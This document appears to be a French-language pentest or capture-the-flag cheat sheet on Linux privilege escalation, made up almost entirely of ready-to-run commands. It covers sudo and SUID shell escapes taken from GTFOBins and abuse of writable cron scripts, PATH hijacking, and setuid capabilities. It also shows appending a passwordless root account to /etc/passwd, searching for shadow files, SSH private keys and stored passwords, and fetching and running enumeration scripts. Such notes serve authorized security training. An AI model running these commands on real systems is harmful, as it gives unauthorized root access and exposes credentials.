# 03 — Privesc Linux

---

## Premiers réflexes après connexion

```bash
whoami && id          # qui suis-je
uname -a              # version kernel
cat /etc/os-release   # distro
hostname
```

---

## Sudo

```bash
# Voir ce qu'on peut faire sans mot de passe
sudo -l

# Exemples d'exploitation (GTFOBins)
sudo vim      → :!/bin/bash
sudo less     → !/bin/bash
sudo find     → sudo find . -exec /bin/bash \;
sudo python3  → sudo python3 -c 'import os; os.system("/bin/bash")'
sudo tee      → echo "user::0:0::/root:/bin/bash" | sudo tee -a /etc/passwd
```

---

## SUID

```bash
# Trouver les binaires SUID
find / -perm -4000 -type f 2>/dev/null

# Exemples d'exploitation
/usr/bin/find   → find . -exec /bin/bash -p \;
/usr/bin/vim    → vim -c ':py import os; os.execl("/bin/sh","sh","-p")'
/usr/bin/python → python -c 'import os; os.execl("/bin/sh","sh","-p")'
/usr/bin/cp     → cp /bin/bash /tmp/bash; chmod +s /tmp/bash; /tmp/bash -p
```

> **Référence :** https://gtfobins.github.io

---

## Cron jobs

```bash
# Voir les crons système
cat /etc/crontab
ls -la /etc/cron* 

# Voir les crons de tous les utilisateurs
crontab -l
cat /var/spool/cron/crontabs/*

# Si un script cron est writable
echo 'chmod +s /bin/bash' >> /opt/script.sh
# attendre l'exécution puis : /bin/bash -p
```

---

## Capabilities

```bash
# Lister les capabilities
getcap -r / 2>/dev/null

# Exploitation — python avec cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Exploitation — perl
perl -e 'use POSIX (setuid); setuid(0); exec "/bin/bash";'
```

---

## Fichiers sensibles

```bash
# Mots de passe en clair
cat /etc/passwd
cat /etc/shadow          # nécessite root ou readable
find / -name "*.conf" 2>/dev/null | xargs grep -i password
find / -name ".env" 2>/dev/null

# Clés SSH
find / -name "id_rsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# Historique de commandes
cat ~/.bash_history
cat ~/.zsh_history
```

---

## Writable /etc/passwd

```bash
# Si /etc/passwd est writable
echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd
su hacker
# → root sans mot de passe
```

---

## Path Hijacking

```bash
# Un script root appelle une commande sans chemin absolu
export PATH=/tmp:$PATH
echo '/bin/bash' > /tmp/nom_commande
chmod +x /tmp/nom_commande
# relancer le script → shell root
```

---

## Outils automatiques

```bash
# LinPEAS — énumération automatique
curl -o linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh && ./LinEnum.sh
```
